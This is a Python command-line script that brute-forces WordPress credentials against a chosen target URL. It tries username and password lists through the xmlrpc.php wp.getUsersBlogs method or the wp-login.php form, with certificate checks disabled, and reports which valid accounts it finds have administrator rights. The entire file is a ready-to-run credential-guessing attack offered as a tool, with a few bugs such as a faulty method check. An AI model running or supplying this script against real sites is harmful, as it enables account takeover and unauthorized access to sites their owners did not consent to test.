#!/usr/bin/python3
import requests
import argparse, logging, sys
import xml.etree.ElementTree as ET

FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
V_CREDS = []

def xmlrpc_api():
    global V_CREDS
    try:
        for username in username_list:
            for index, password in enumerate(password_list):
                data = f'<methodCall> \r\n<methodName>wp.getUsersBlogs</methodName> \r\n<params> \r\n<param><value>{username}</value></param> \r\n<param><value>{password}</value></param> \r\n</params> \r\n</methodCall>'
                r = s.post(args.url+'/xmlrpc.php', headers=headers, data=data, verify=False)
                msg = f'{username} : {password}'.replace('\n','')
                if 'Incorrect username or password.' in r.text:
                    logging.info(f'{index}][ Tryed: {msg}')
                else:
                    tree = ET.ElementTree(ET.fromstring(r.content))
                    root = tree.getroot()
                    role = [elem.text for elem in root.iter('boolean')][0]
                    if int(role) == 1:
                        msg += ' - is Administrator'
                    logging.info(f'Find: {msg}')
                    V_CREDS.append(msg)

    except Exception as e:
        print(f'[#] Brute Force via Xmlrpc  Failed : {e}')
        exit(-1)

def loginPage():
    global V_CREDS
    try:
        for username in username_list:
            for password in password_list:
                data = {
                    'log':username,
                    'pwd':password,
                    'wp-submit':'Login In'
                }
                r = s.post(args.url+'/wp-login.php', headers=headers, data=data, verify=False)
                msg = f'{username} : {password}'.replace('\n','')
                if 'dashboard' in r.text:
                    msg = f'{username} : {password}'.replace('\n','')
                    if 'plugins.php' in r.text:
                        msg += ' - is Administrator'
                    logging.info(f'Find: {msg}')
                    V_CREDS.append(msg)
                else:
                    logging.info(f'Tryed: {msg}')

    except Exception as e:
        print(f' Brute Force via Login Page Failed : {e}')
        exit(-1)

def main():
    print("\n| Start Brute Force Script")
    if ('x' or 'xmlrpc') in args.methode:
        print('[#] Brute Force via xmlrpc.php')
        r = s.post(args.url+'/xmlrpc.php', headers=headers, verify=False)
        if r.status_code != 200:
            print('XML-RPC services are disabled on this site')
            exit(-1)
        xmlrpc_api()

        # with ThreadPoolExecutor(max_workers=thread) as executor:
    #     for username in username_list:
    #         for index, password in enumerate(password_list,start=1):
    #             future = executor.submit(xmlrpc_api,username,password)
    #             #future.cancel()
    #             print(future)

    else:
        print('Brute Force via Login Form')
        r = s.post(args.url+'/wp-login.php', headers=headers, verify=False)
        if r.status_code != 200:
            print('Login Page incorrect')   
            exit(-1)
        loginPage()
    if len(V_CREDS):
        print('\n| Findings:')
        for creds in V_CREDS:
            print(creds)
    else:
        print('| No Valide Credentials found')
    print('\n| End')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Brute Force Script, find valide login credentials from username or password (-list)')
    group_user = parser.add_mutually_exclusive_group(required=True)
    group_password = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('--url', required=True, type=str, help='Target WordPress Url')
    group_user.add_argument('-u', '--userlist', type=str, help='List with Usernames')
    group_user.add_argument('-U', '--user', nargs='+', type=str, help='Individual Usernames')
    group_password.add_argument('-p', '--passwordlist', type=str, help='List with Passwords')
    group_password.add_argument('-P', '--password', nargs='+', type=str, help='Individual Passwords')
    parser.add_argument('-m', '--methode', choices=['x','xmlrpc','l','loginpage'], type=str, default='loginpage', help='Choose x=xmlrpc or l=loginpage (=Default)')
    parser.add_argument('-o', '--output', nargs='?', default=None, const='wpsername.lst')
    parser.add_argument('-log', '--level', default=20, type=int, help='Set Logging Level')
    args = parser.parse_args()

    args.url = args.url.rstrip('/')
    logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=args.level)

    s = requests.session()
    username_list = args.user
    if args.userlist:
        f = open(args.userlist,"r")
        username_list = f.readlines()
    password_list = args.password
    if args.passwordlist:
        f = open(args.passwordlist,"r")
        password_list = f.readlines()

    headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
    }

    main()
